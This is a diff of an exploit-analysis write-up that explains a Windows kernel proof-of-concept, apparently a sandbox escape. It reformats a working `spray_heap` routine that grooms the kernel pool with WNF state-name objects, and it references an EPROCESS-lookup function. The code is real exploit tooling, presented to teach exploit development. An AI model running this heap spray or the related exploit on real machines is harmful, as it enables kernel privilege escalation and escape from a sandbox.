@@ -1,54 +1,64 @@
 
 ### The spray_heap Function
 
+The `spray_heap` function is relatively small compared to the other functions we covered, let's go ahead and start its analysis by looking at the function's return type and input arguments: 
 
-ADD_LOW_INTEGRITY
+```cpp
+NTSTATUS spray_heap(_Out_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _In_ char *buf, _In_ UINT64 buf_sz)
+```
 
+As expected, the `spray_heap` function returns a `NTSTATUS` value. Looking at the input arguments we see the following: 
+
+* `statenames`: A non-NULL point to a `PWNF_STATE_NAME` buffer.
+* `count`: A read-only unsigned 64-bit value used as the upper limit to the heap spray.
+* `buf`: A read-only pointer to a character array containing the value for the `Buffer` parameter for `NtUpdateWnfStateData`.
+* `buf_sz`: A read-only unsigned 64-bit integer used as the `Length` parameter for `NtUpdateWnfStateData`. 
+
+Let's now examine the two variable declarations used in `spray_heap`:
+
+```cpp
+NTSTATUS                status = STATUS_SUCCESS;
+SECURITY_DESCRIPTOR     *sd = (SECURITY_DESCRIPTOR *)zalloc(sizeof(SECURITY_DESCRIPTOR));
+```
 
 
 
 ```cpp
-NTSTATUS spray_heap(_Out_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _In_ char *buf, _In_ UINT64 buf_sz)
-{
-    NTSTATUS                status = STATUS_SUCCESS;
-    SECURITY_DESCRIPTOR     *sd = (SECURITY_DESCRIPTOR *)zalloc(sizeof(SECURITY_DESCRIPTOR));
+if (!sd) {
+    log_warn("spray_heap::zalloc()1");
+    status = STATUS_NO_MEMORY;
+    goto out;
+}
 
-    if (!sd) {
-        log_warn("spray_heap::zalloc()1");
-        status = STATUS_NO_MEMORY;
+sd->Revision = 0x1;
+sd->Sbz1 = 0;
+sd->Control = 0x800c;
+sd->Owner = 0;
+sd->Group = (PSID)0;
+sd->Sacl = (PACL)0;
+sd->Dacl = (PACL)0;
+
+for (int i = 0; i < count; i++) {
+    status = _NtCreateWnfStateName(&(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
+    if (!NT_SUCCESS(status)) {
+        log_warn("spray_heap::_NtCreateWnfStateName()1");
         goto out;
     }
 
-    sd->Revision = 0x1;
-    sd->Sbz1 = 0;
-    sd->Control = 0x800c;
-    sd->Owner = 0;
-    sd->Group = (PSID)0;
-    sd->Sacl = (PACL)0;
-    sd->Dacl = (PACL)0;
-
-    for (int i = 0; i < count; i++) {
-        status = _NtCreateWnfStateName(&(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
-        if (!NT_SUCCESS(status)) {
-            log_warn("spray_heap::_NtCreateWnfStateName()1");
-            goto out;
-        }
-
-        status = _NtUpdateWnfStateData(&(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
-        if (!NT_SUCCESS(status)) {
-            log_warn("spray_heap::_NtUpdateWnfStateName()1");
-            goto out;
-        }
+    status = _NtUpdateWnfStateData(&(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
+    if (!NT_SUCCESS(status)) {
+        log_warn("spray_heap::_NtUpdateWnfStateName()1");
+        goto out;
     }
+}
 
-    printf("[+] Sprayed 0x%llx chunks of 0xc0 sized WNF structures\n", count * 2);
+printf("[+] Sprayed 0x%llx chunks of 0xc0 sized WNF structures\n", count * 2);
 
 out:
-    if (sd)
-        free(sd);
+if (sd)
+    free(sd);
 
-    return status;
-}
+return status;
 ```
 
 ### The get_eproc Function
@@ -390,6 +400,25 @@ out:
     return 0;
 }
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ## Escaping the Sandbox with Y3A's Proof-of-Concept
 
